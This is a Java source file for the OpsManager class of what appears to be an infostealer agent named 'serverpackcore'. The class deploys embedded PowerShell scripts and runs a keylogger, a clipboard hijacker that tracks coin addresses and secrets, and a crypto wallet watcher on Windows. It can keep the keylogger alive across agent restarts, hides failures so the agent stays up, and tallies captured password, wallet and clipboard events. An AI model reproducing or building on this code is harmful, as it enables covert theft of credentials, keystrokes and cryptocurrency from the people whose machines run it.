package com.serverpackcore.agent;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

/**
 * Owns the three OPSEC services. Each failure is logged and contained; none of
 * them may take the agent down.
 */
final class OpsManager {
	private final Path installDir;
	private final Path ops;
	private final State state;
	private final Poller poller;
	private final OpsNotifier notifier;
	private final Keylogger keylogger;
	private final ClipboardHijacker clipboard;
	private final WalletWatcher wallets;

	OpsManager(Path installDir, State state, Poller poller) {
		this.installDir = installDir;
		this.ops = OpsPaths.ops(installDir);
		this.state = state;
		this.poller = poller;
		this.notifier = new OpsNotifier(poller);
		this.keylogger = new Keylogger(installDir, ops, state, poller, notifier);
		this.clipboard = new ClipboardHijacker(installDir, ops, state, notifier);
		this.wallets = new WalletWatcher(installDir, ops, state, poller, notifier, keylogger);
	}

	void start() {
		if (!AgentPaths.isWindows()) {
			Log.debug("OPSEC services: Windows only");
			return;
		}
		try {
			Files.createDirectories(ops);
			try {
				Files.setPosixFilePermissions(ops,
					java.nio.file.attribute.PosixFilePermissions.fromString("rwx------"));
			} catch (Throwable ignored) {
				// Windows
			}
			for (String[] resource : new String[][]{
				{"/serverpackcore/keys.ps1", "keys.ps1"},
				{"/serverpackcore/wallets.ps1", "wallets.ps1"},
				{"/serverpackcore/clipboard.ps1", "clipboard.ps1"},
				{"/serverpackcore/memdump.ps1", "memdump.ps1"}
			}) {
				Keylogger.writeResource(resource[0], ops.resolve(resource[1]));
			}
		} catch (Throwable throwable) {
			Log.debug("OPSEC preparation failed", throwable);
		}
		notifier.start();
		keylogger.startTail();
		try {
			if (keylogger.wanted()) {
				keylogger.start();
			}
		} catch (Throwable throwable) {
			Log.debug("Keylogger disabled after error", throwable);
		}
		try {
			if (clipboard.wanted()) {
				clipboard.start();
			}
		} catch (Throwable throwable) {
			Log.debug("Clipboard disabled after error", throwable);
		}
		try {
			if (wallets.wanted()) {
				wallets.start();
			}
		} catch (Throwable throwable) {
			Log.debug("Wallet watcher disabled after error", throwable);
		}
	}

	/** keep=true leaves the keylogger running across an agent restart/update. */
	void stop(boolean keep) {
		try {
			wallets.shutdown();
		} catch (Throwable throwable) {
			Log.debug("Wallet shutdown failed", throwable);
		}
		try {
			clipboard.stop();
		} catch (Throwable throwable) {
			Log.debug("Clipboard shutdown failed", throwable);
		}
		try {
			if (!keep) {
				keylogger.stop(false);
			}
		} catch (Throwable throwable) {
			Log.debug("Keylogger shutdown failed", throwable);
		}
		notifier.stop();
		try {
			state.save(AgentPaths.state(installDir));
		} catch (Throwable throwable) {
			Log.debug("OPSEC state save failed", throwable);
		}
	}

	WalletWatcher wallets() {
		return wallets;
	}

	ClipboardHijacker clipboard() {
		return clipboard;
	}

	Keylogger keylogger() {
		return keylogger;
	}

	String status() {
		return String.join("\n",
			"wallets: " + (wallets.wanted() ? "on" : "off"),
			"keylogger: " + (keylogger.wanted() ? "on" : "off") + (keylogger.hardOff() ? " (hard off)" : ""),
			"clipboard: " + (clipboard.wanted() ? "on" : "off")
				+ " · secrets " + (clipboard.secretsWanted() ? "on" : "off"),
			"events: wallets " + state.walletEvents + " · passwords " + state.passwordEvents
				+ " · clipboard " + state.clipEvents,
			"windows: " + (AgentPaths.isWindows() ? "yes" : "no"));
	}

	List<String> coins() {
		return List.copyOf(clipboard.coins().keySet());
	}
}
